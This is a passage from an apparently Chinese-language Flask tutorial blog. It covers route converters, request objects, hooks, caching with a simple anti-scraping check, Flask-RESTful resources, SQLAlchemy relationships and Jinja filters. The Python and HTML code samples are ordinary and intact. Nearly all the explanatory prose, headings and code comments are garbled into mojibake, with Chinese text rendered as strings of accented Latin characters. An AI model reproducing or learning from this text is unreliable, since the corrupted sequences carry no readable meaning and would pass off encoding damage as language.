<p>int  æ¥æ”¶æ•´å‹</p>
<p>float   æ¥æ”¶æµ®ç‚¹å‹</p>
<p>path  æ¥æ”¶è·¯å¾„ï¼Œå¯æ¥æ”¶æ–œçº¿(â€˜&#x2F;â€˜)</p>
<p>uuid   åªæ¥å—uuidå­—ç¬¦ä¸²ï¼Œå”¯ä¸€ç ï¼Œä¸€ç§ç”Ÿæˆè§„å¾‹ï¼ˆuuidæ˜¯ä¸€æ®µç‰¹å®šçš„å­—ç¬¦ä¸²ï¼ŒåŸºæœ¬æ— æ³•ä¼ªé€ ï¼‰</p>
<p>any   å¯ä»¥åŒæ—¶æŒ‡å®šå¤šç§è·¯å¾„ï¼Œè¿›è¡Œé™å®š</p>
</blockquote>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/any/&lt;any(apple, orange, banana):fruit&gt;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_any</span>(<span class="params">fruit</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(fruit))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(fruit)</span><br></pre></td></tr></table></figure>

<p>anyè¡¨ç¤ºé™å®šåªèƒ½åœ¨ç»™å®šçš„ä¹‹ä¸­é€‰æ‹©</p>
<h2 id="6ã€è·¯ç”±è¯·æ±‚æ–¹æ³•çš„æŒ‡å®š"><a href="#6ã€è·¯ç”±è¯·æ±‚æ–¹æ³•çš„æŒ‡å®š" class="headerlink" title="6ã€è·¯ç”±è¯·æ±‚æ–¹æ³•çš„æŒ‡å®š"></a>6ã€è·¯ç”±è¯·æ±‚æ–¹æ³•çš„æŒ‡å®š</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/login/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br></pre></td></tr></table></figure>

<p>è®¾ç½®è¯¥è·¯ç”±å¯ä»¥ç”±GETå’ŒPOSTè¿™ä¸¤ç§è¯·æ±‚æ–¹æ³•åŒºè®¿é—®</p>
<p>ä¸€äº›æœ€å¸¸è§çš„è¯·æ±‚æ–¹å¼</p>
<blockquote>
<p>GET</p>
<p>POST</p>
<p>PUT</p>
<p>DELETE</p>
</blockquote>
<h1 id="å››ã€flaskä¸­å››ä¸ªå…¨å±€å˜é‡"><a href="#å››ã€flaskä¸­å››ä¸ªå…¨å±€å˜é‡" class="headerlink" title="å››ã€flaskä¸­å››ä¸ªå…¨å±€å˜é‡"></a>å››ã€flaskä¸­å››ä¸ªå…¨å±€å˜é‡</h1><p>**</p>
<table>
<thead>
<tr>
<th><strong>å˜é‡</strong></th>
<th><strong>ä¸Šä¸‹æ–‡</strong></th>
<th><strong>æè¿°</strong></th>
</tr>
</thead>
<tbody><tr>
<td>current_app</td>
<td>åº”ç”¨ä¸Šä¸‹æ–‡</td>
<td>ç›¸å½“ä¸åœ¨ä¸»ç¨‹åºä¸­æ¿€æ´»çš„å®ä¾‹åŒ–appï¼ˆ<code>app=Flask(__name__)</code>ï¼‰</td>
</tr>
<tr>
<td>g</td>
<td>åº”ç”¨ä¸Šä¸‹æ–‡</td>
<td>ä¸€æ¬¡æ€§å‡½æ•°ï¼Œå¤„ç†è¯·æ±‚çš„ä¸´æ—¶å˜é‡ã€‚åªåœ¨ä¸€ä¸ªè¯·æ±‚ä¸­è¢«åº”ç”¨ï¼Œä¸‹ä¸ªè¯·æ±‚å¼€å§‹æ—¶ä¼šè‡ªåŠ¨é‡ç½®</td>
</tr>
<tr>
<td>request</td>
<td>è¯·æ±‚ä¸Šä¸‹æ–‡</td>
<td>è¯·æ±‚å¯¹è±¡ã€‚å­˜æ”¾äº†å®¢æˆ·ç«¯å‘æ¥çš„HTTPä¿¡æ¯</td>
</tr>
<tr>
<td>session</td>
<td>è¯·æ±‚ä¸Šä¸‹æ–‡</td>
<td>è®°å½•ç”¨æˆ·å’ŒæœåŠ¡å™¨ä¹‹é—´çš„ä¼šè¯çš„ã€‚åœ¨æœåŠ¡å™¨ç«¯è®°å½•éœ€è¦è®°ä½çš„ä¿¡æ¯ã€‚ï¼ˆå’Œcookieå¯¹åº”ï¼Œcookiesæ˜¯è®°å½•åœ¨å®¢æˆ·ç«¯çš„ï¼‰</td>
</tr>
</tbody></table>
<p><strong>requestä¸­çš„ä¸€äº›ç”¨æ³•:</strong></p>
<blockquote>
<p>url   å®Œæ•´è¯·æ±‚åœ°å€</p>
<p>base_url   å»æ‰GETå‚æ•°çš„URL</p>
<p>host_url   åªæœ‰ä¸»æœºå’Œç«¯å£å·çš„URL</p>
<p>path  è·¯ç”±ä¸­çš„è·¯å¾„</p>
<p>method è¯·æ±‚æ–¹å¼</p>
<p>remote_addr  è¯·æ±‚çš„å®¢æˆ·ç«¯åœ°å€</p>
<p>args   GETè¯·æ±‚å‚æ•°</p>
<p>form   POSTè¯·æ±‚å‚æ•°</p>
<p>files   æ–‡ä»¶ä¸Šä¼ </p>
<p>headers  è¯·æ±‚å¤´</p>
<p>cookies   è¯·æ±‚å¤´ä¸­çš„cookie</p>
</blockquote>
<h1 id="äº”ã€é’©å­å‡½æ•°è£…é¥°å™¨"><a href="#äº”ã€é’©å­å‡½æ•°è£…é¥°å™¨" class="headerlink" title="äº”ã€é’©å­å‡½æ•°è£…é¥°å™¨"></a>äº”ã€é’©å­å‡½æ•°è£…é¥°å™¨</h1><table>
<thead>
<tr>
<th>å‡½æ•°</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>before_first_request</td>
<td>å¤„ç†ç¬¬ä¸€æ¬¡è¯·æ±‚ä¹‹å‰</td>
</tr>
<tr>
<td>before_request</td>
<td>åœ¨æ¯æ¬¡è¯·æ±‚ä¹‹å‰ï¼Œé€šå¸¸åˆ©ç”¨è¿™ä¸ªå¤„ç†ä¸€äº›å˜é‡ï¼Œå®ç°åçˆ¬</td>
</tr>
<tr>
<td>app.after_request</td>
<td>æ³¨å†Œä¸€ä¸ªå‡½æ•°ï¼Œå¦‚æœæ²¡æœ‰æœªå¤„ç†çš„å¼‚å¸¸æŠ›å‡ºï¼Œæ¯æ¬¡è¯·æ±‚ç»“æŸåè¿è¡Œ</td>
</tr>
<tr>
<td>app.teardown_request</td>
<td>æœ‰å¼‚å¸¸ä¹Ÿä¼šè¿è¡Œï¼Œæ¯æ¬¡è¯·æ±‚ç»“æŸåã€‚å½“APPä¸Šä¸‹æ–‡è¢«ç§»é™¤åæ‰§è¡Œçš„å‡½æ•°ï¼Œå¯ä»¥è¿›è¡Œæ•°æ®åº“çš„æäº¤å’Œå›æ»š</td>
</tr>
</tbody></table>
<p>ä½¿ç”¨ç¤ºä¾‹ï¼š</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blue.before_request  </span><span class="comment">#æ¯æ¬¡è¯·æ±‚ä¹‹å‰è®¿é—®</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">before</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;before request&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="å…­ã€Flaskçš„ä¸€äº›æ’ä»¶çš„ä½¿ç”¨"><a href="#å…­ã€Flaskçš„ä¸€äº›æ’ä»¶çš„ä½¿ç”¨" class="headerlink" title="å…­ã€Flaskçš„ä¸€äº›æ’ä»¶çš„ä½¿ç”¨"></a>å…­ã€Flaskçš„ä¸€äº›æ’ä»¶çš„ä½¿ç”¨</h1><h2 id="1ã€flask-caching"><a href="#1ã€flask-caching" class="headerlink" title="1ã€flask-caching"></a>1ã€flask-caching</h2><p>å®‰è£…</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">pip install flask-caching</span><br></pre></td></tr></table></figure>

<p>åˆå§‹åŒ–</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">cache = Cache(config=&#123;</span><br><span class="line">    <span class="string">&#x27;CACHE_TYPE&#x27;</span>: <span class="string">&#x27;simple&#x27;</span>  <span class="comment">#ç¼“å­˜ç±»å‹</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>æ·»åŠ ç¼“å­˜</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@cache.cached(<span class="params">timeout=<span class="number">20</span></span>)   </span><span class="comment">#ä½¿ç¼“å­˜å­˜åœ¨20ç§’</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;index2&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(g.star)</span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;index2&#x27;</span></span><br></pre></td></tr></table></figure>

<p>å¯¹åçˆ¬çš„ç›¸å…³åº”ç”¨</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blue.before_request  </span><span class="comment">#æ¯æ¬¡è¯·æ±‚ä¹‹å‰è®¿é—®</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">before</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;before request&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(request.path)</span><br><span class="line">    <span class="built_in">print</span>(request.method)</span><br><span class="line">    <span class="built_in">print</span>(request.remote_addr)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#ç®€å•çš„åçˆ¬</span></span><br><span class="line">    <span class="built_in">print</span>(request.user_agent)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;python&#x27;</span> <span class="keyword">in</span> request.user_agent.string:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;æ‚¨æ­£åœ¨ä½¿ç”¨pythonçˆ¬è™«ï¼Œå†è§ï¼&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#é’ˆå¯¹ipä½œåçˆ¬</span></span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span> cache.get(ip):</span><br><span class="line">        <span class="comment">#åšäº†ä¸ªæ‹¦æˆªï¼Œä¸ä¼šè¿›å…¥è§†å›¾å‡½æ•°</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;å°ä¼™å­ï¼Œåˆ«çˆ¬äº†ï¼&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment">#å¯¹æ¯ä¸ªipè®¾ç½®ä¸€ä¸ªç¼“å­˜ï¼Œ1ç§’å†…ä¸è®©é‡å¤è®¿é—®</span></span><br><span class="line">        cache.<span class="built_in">set</span>(ip, <span class="string">&#x27;value&#x27;</span>, timeout=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h1 id="ä¸ƒã€å‰åç«¯åˆ†ç¦»æ¨¡å¼"><a href="#ä¸ƒã€å‰åç«¯åˆ†ç¦»æ¨¡å¼" class="headerlink" title="ä¸ƒã€å‰åç«¯åˆ†ç¦»æ¨¡å¼"></a>ä¸ƒã€å‰åç«¯åˆ†ç¦»æ¨¡å¼</h1><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-19/7a211a47e9bdbf3195d69d8b36829d3b--ad35--image-20231119204503992.png" alt="image-20231119204503992"></p>
<p>å°†åŸæœ¬çš„viewsæ‹†åˆ†ä¸ºurlså’Œapisã€‚</p>
<p>urls.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  è·¯ç”±æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> .exts <span class="keyword">import</span> api</span><br><span class="line"><span class="keyword">from</span> .apis <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">api.add_resource(HelloResource, <span class="string">&#x27;/hello/&#x27;</span>)</span><br><span class="line">api.add_resource(UserResource, <span class="string">&#x27;/user/&#x27;</span>, endpoint=<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">api.add_resource(User2Resource, <span class="string">&#x27;/user2/&#x27;</span>)</span><br><span class="line">api.add_resource(User4Resource, <span class="string">&#x27;/user4/&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>apis.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> jsonify</span><br><span class="line"><span class="keyword">from</span> flask_restful <span class="keyword">import</span> Resource, fields, marshal_with, reqparse</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç±»è§†å›¾  CBV</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HelloResource</span>(<span class="title class_ inherited__">Resource</span>):   <span class="comment">#å¿…é¡»è¦ç»§æ‰¿Resource</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;getè¯·æ±‚&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;methods&#x27;</span>: <span class="string">&#x27;postè¯·æ±‚&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Flask-RESTful</span></span><br><span class="line">ret_field = &#123;</span><br><span class="line">    <span class="string">&#x27;status&#x27;</span>: fields.Integer,</span><br><span class="line">    <span class="string">&#x27;msg&#x27;</span>: fields.String,</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>: fields.String,</span><br><span class="line">    <span class="string">&#x27;like&#x27;</span>: fields.String(default=<span class="string">&#x27;ball&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;data2&#x27;</span>: fields.String(attribute=<span class="string">&#x27;data&#x27;</span>) <span class="comment">#ç±»ä¼¼äºå¼•ç”¨ï¼Œå°†dataçš„å€¼ç»™ä¸€ä¸ªå¦å¤–åå­—çš„å˜é‡</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserResource</span>(<span class="title class_ inherited__">Resource</span>):</span><br><span class="line"><span class="meta">    @marshal_with(<span class="params">ret_field</span>)     </span><span class="comment">#flaskçš„ä¸€ä¸ªæ‹“å±•ï¼Œç”¨ä»¥è§„èŒƒåç«¯è¿”å›æ•°æ®çš„æ ¼å¼</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;ok&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span>: <span class="string">&#x27;åƒå³°æ•™è‚²Python&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user_fields = &#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: fields.Integer,</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: fields.String,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span>: fields.Integer,</span><br><span class="line">    <span class="string">&#x27;url&#x27;</span>: fields.Url(endpoint=<span class="string">&#x27;id&#x27;</span>, absolute=<span class="literal">True</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret_field2 = &#123;</span><br><span class="line">    <span class="string">&#x27;status&#x27;</span>: fields.Integer,</span><br><span class="line">    <span class="string">&#x27;msg&#x27;</span>: fields.String,</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>: fields.Nested(user_fields)  <span class="comment">#è·å–ä¸€ä¸ªåˆ—è¡¨æ•°æ®</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User2Resource</span>(<span class="title class_ inherited__">Resource</span>):</span><br><span class="line"><span class="meta">    @marshal_with(<span class="params">ret_field2</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        user = User.query.first()   <span class="comment">#ä»æ•°æ®åº“ä¸­æ‹¿å‡ºæ•°æ®</span></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;ok&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span>: user</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># å‚æ•°è§£æ  å®Œæˆå‰ç«¯æ•°æ®çš„è¿”å›</span></span><br><span class="line">parser = reqparse.RequestParser()</span><br><span class="line">parser.add_argument(<span class="string">&#x27;name&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;nameæ˜¯å¿…é¡»çš„&#x27;</span>)   </span><br><span class="line">parser.add_argument(<span class="string">&#x27;age&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, action=<span class="string">&#x27;append&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User4Resource</span>(<span class="title class_ inherited__">Resource</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        args = parser.parse_args()</span><br><span class="line">        name = args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">        age = args.get(<span class="string">&#x27;age&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;name&#x27;</span>: name, <span class="string">&#x27;age&#x27;</span>: age&#125;</span><br></pre></td></tr></table></figure>

<h1 id="å…«ã€æ•°æ®è¡¨ä¹‹é—´çš„æ“ä½œ"><a href="#å…«ã€æ•°æ®è¡¨ä¹‹é—´çš„æ“ä½œ" class="headerlink" title="å…«ã€æ•°æ®è¡¨ä¹‹é—´çš„æ“ä½œ"></a>å…«ã€æ•°æ®è¡¨ä¹‹é—´çš„æ“ä½œ</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> .exts <span class="keyword">import</span> db</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¸€å¯¹å¤š</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Grade</span>(db.Model):</span><br><span class="line">    __tablename__ = <span class="string">&#x27;grade&#x27;</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>, autoincrement=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">30</span>), unique=<span class="literal">True</span>, index=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment">#å»ºç«‹å…³è”</span></span><br><span class="line">    <span class="comment">#å®šä¹‰ç­çº§è¡¨çš„ä¸€å¯¹å¤šå…³ç³»ï¼Œä¸æ˜¯å­—æ®µï¼ŒStudentä¸ºå­¦ç”Ÿè¡¨æ¨¡å‹ï¼Œbackrefä¸ºåå‘æŸ¥æ‰¾åç§°</span></span><br><span class="line">    students = db.relationship(<span class="string">&#x27;Student&#x27;</span>, backref=<span class="string">&#x27;grade&#x27;</span>, lazy=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>(db.Model):</span><br><span class="line">    __tablename__ = <span class="string">&#x27;student&#x27;</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>, autoincrement=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">30</span>), unique=<span class="literal">True</span>)</span><br><span class="line">    age = db.Column(db.Integer)</span><br><span class="line">    <span class="comment">#åˆ›å»ºå¤–é”®ï¼Œå…³è”åˆ°ç­çº§è¡¨çš„ä¸»é”®ï¼Œå®ç°ä¸€å¯¹å¤šå…³ç³»ï¼Œç­çº§è¡¨ä¸­ä¹Ÿè¦æœ‰å¯¹åº”æ“ä½œ</span></span><br><span class="line">    gradeid = db.Column(db.Integer, db.ForeignKey(Grade.<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#å¤šå¯¹å¤š    </span></span><br><span class="line"><span class="comment">#ä¸­é—´è¡¨ï¼ˆä¸æ˜¯ç±»ï¼‰    </span></span><br><span class="line">collect = db.Table(</span><br><span class="line">    <span class="string">&#x27;collects&#x27;</span>,</span><br><span class="line">    <span class="comment">#user_idä¸ºè¡¨å­—æ®µåç§°ï¼Œuser.idæœªå¤–é”®è¡¨çš„id</span></span><br><span class="line">    db.Column(<span class="string">&#x27;user_id&#x27;</span>, db.Integer, db.ForeignKey(<span class="string">&#x27;usermodel.id&#x27;</span>), primary_key=<span class="literal">True</span>),</span><br><span class="line">    db.Column(<span class="string">&#x27;movie_id&#x27;</span>, db.Integer, db.ForeignKey(<span class="string">&#x27;movie.id&#x27;</span>), primary_key=<span class="literal">True</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserModel</span>(db.Model):</span><br><span class="line">    __tablename__ = <span class="string">&#x27;usermodel&#x27;</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>, autoincrement=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">30</span>))</span><br><span class="line">    age = db.Column(db.Integer)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Movie</span>(db.Model):</span><br><span class="line">    __tablename__ = <span class="string">&#x27;movie&#x27;</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>, autoincrement=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">30</span>))</span><br><span class="line">    age = db.Column(db.Integer)</span><br><span class="line">	</span><br><span class="line">    <span class="comment">#å¤šå¯¹å¤š  å…³è”çš„å­¦ç”Ÿæ‘†ä¸ªçš„æ¨¡å‹   ä¸­é—´è¡¨çš„åç§°   åå‘æŸ¥æ‰¾</span></span><br><span class="line">    users = db.relationship(<span class="string">&#x27;UserModel&#x27;</span>, backref=<span class="string">&#x27;movies&#x27;</span>, lazy=<span class="string">&#x27;dynamic&#x27;</span>, secondary=collect)</span><br></pre></td></tr></table></figure>

<p>lazyå±æ€§</p>
<blockquote>
<p>dynamicï¼š    ä¼šè¿”å›ä¸€ä¸ªqueryå¯¹è±¡(æŸ¥è¯¢é›†)ï¼Œå¯ä»¥ç»§ç»­ä½¿ç”¨å…¶ä»–æŸ¥è¯¢æ–¹æ³•ï¼Œå¦‚all()</p>
<p>selectï¼š    é¦–æ¬¡è®¿é—®åˆ°å±æ€§çš„æ—¶å€™ï¼Œå°±ä¼šåŠ è½½è¯¥å±æ€§çš„æ•°æ®</p>
<p>joinedï¼š    åœ¨å¯¹å…³è”çš„ä¸¤ä¸ªè¡¨è¿›è¡Œjoinæ“ä½œï¼Œä»è€Œè·å–åˆ°æ‰€æœ‰ç›¸å…³çš„å¯¹è±¡</p>
<p>Trueï¼š    è¿”å›ä¸€ä¸ªå¯ç”¨çš„åˆ—è¡¨å¯¹è±¡ï¼ŒåŒselect</p>
</blockquote>
<h1 id="ä¹ã€å‰ç«¯é¡µé¢æ¸²æŸ“çš„ä¸€äº›å‡½æ•°æ“ä½œ"><a href="#ä¹ã€å‰ç«¯é¡µé¢æ¸²æŸ“çš„ä¸€äº›å‡½æ•°æ“ä½œ" class="headerlink" title="ä¹ã€å‰ç«¯é¡µé¢æ¸²æŸ“çš„ä¸€äº›å‡½æ•°æ“ä½œ"></a>ä¹ã€å‰ç«¯é¡µé¢æ¸²æŸ“çš„ä¸€äº›å‡½æ•°æ“ä½œ</h1><table>
<thead>
<tr>
<th>å‡½æ•°</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>capitalize</td>
<td>é¦–å­—æ¯å¤§å†™</td>
</tr>
<tr>
<td>upper</td>
<td>å…¨éƒ¨å¤§å†™</td>
</tr>
<tr>
<td>lower</td>
<td>å…¨éƒ¨å°å†™</td>
</tr>
<tr>
<td>title</td>
<td>æ¯ä¸ªå•è¯é¦–å­—æ¯å¤§å†™</td>
</tr>
<tr>
<td>trim</td>
<td>å»æ‰ä¸¤è¾¹çš„ç©ºç™½</td>
</tr>
<tr>
<td>striptags</td>
<td>å»æ‰æ‰€æœ‰çš„HTMLæ ‡ç­¾</td>
</tr>
<tr>
<td>safe</td>
<td>å³åˆ é™¤æ ‡ç­¾ï¼Œåˆä¿ç•™æ ‡ç­¾åŠŸèƒ½</td>
</tr>
</tbody></table>
<p>æˆ‘ä»¬å°±å¯ä»¥åœ¨htmlé¡µé¢ä¸­å»ä½¿ç”¨</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>æ¨¡æ¿<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello &#123;&#123; name|capitalize &#125;&#125; ! <span class="tag">&lt;/<span class="name">h1</span>&gt;</span>	</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±å¯ä»¥å»ä¾¿åˆ©æˆ‘ä»¬å¯¹å‚æ•°çš„ä½¿ç”¨</p>
<h1 id="åã€å®è·µæ“ä½œâ€“ä¸ªäººç®€æ˜“åšå®¢çš„æ­å»º"><a href="#åã€å®è·µæ“ä½œâ€“ä¸ªäººç®€æ˜“åšå®¢çš„æ­å»º" class="headerlink" title="åã€å®è·µæ“ä½œâ€“ä¸ªäººç®€æ˜“åšå®¢çš„æ­å»º"></a>åã€å®è·µæ“ä½œâ€“ä¸ªäººç®€æ˜“åšå®¢çš„æ­å»º</h1><h2 id="1ã€æ›´åŠ æ¸…æ™°åˆ†æ˜çš„æ–‡ä»¶ç»“æ„ï¼š"><a href="#1ã€æ›´åŠ æ¸…æ™°åˆ†æ˜çš„æ–‡ä»¶ç»“æ„ï¼š" class="headerlink" title="1ã€æ›´åŠ æ¸…æ™°åˆ†æ˜çš„æ–‡ä»¶ç»“æ„ï¼š"></a>1ã€æ›´åŠ æ¸…æ™°åˆ†æ˜çš„æ–‡ä»¶ç»“æ„ï¼š</h2><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/650f1da2ad366d5775354e62a0abfe6f--661f--image-20231125193419163.png" alt="image-20231125193419163"></p>
<p>ç”±äºéœ€è¦æœ‰å‰ç«¯æ˜¾ç¤ºå’Œåç«¯ç®¡ç†ä¸¤ä¸ªå±‚é¢ï¼Œæ‰€ä»¥å°†è§†å›¾æ–‡ä»¶ï¼Œæ¨¡æ¿æ–‡ä»¶ï¼Œä»¥åŠé™æ€æ–‡ä»¶åˆ†ä¸ºä¸¤ä¸ªï¼Œå¹¶ä¸”ä¸“é—¨åˆ›å»ºäº†ä¸€ä¸ªæ–‡ä»¶å¤¹å»å­˜æ”¾ï¼Œè¿™æ ·å°±èƒ½å»æ›´æ¸…æ™°çš„å»æ–‡ä»¶åˆ†ç±»ã€‚</p>
<h2 id="2ã€ä»£ç ç¼–å†™ä¸­çš„ä¸€äº›çŸ¥è¯†å­¦ä¹ "><a href="#2ã€ä»£ç ç¼–å†™ä¸­çš„ä¸€äº›çŸ¥è¯†å­¦ä¹ " class="headerlink" title="2ã€ä»£ç ç¼–å†™ä¸­çš„ä¸€äº›çŸ¥è¯†å­¦ä¹ "></a>2ã€ä»£ç ç¼–å†™ä¸­çš„ä¸€äº›çŸ¥è¯†å­¦ä¹ </h2><h3 id="1-è£…é¥°å™¨çš„ä½¿ç”¨"><a href="#1-è£…é¥°å™¨çš„ä½¿ç”¨" class="headerlink" title="1)è£…é¥°å™¨çš„ä½¿ç”¨"></a>1)è£…é¥°å™¨çš„ä½¿ç”¨</h3><p>å¯¹ç™»å½•ç•Œé¢ä½¿ç”¨è£…é¥°å™¨è¿›è¡Œç®€åŒ–ï¼Œå¹¶ä¸”è§£å†³flaskä¸­ä½¿ç”¨ä¸¤æ¬¡åŒä¸ªè£…é¥°å™¨çš„æŠ¥é”™ã€‚</p>
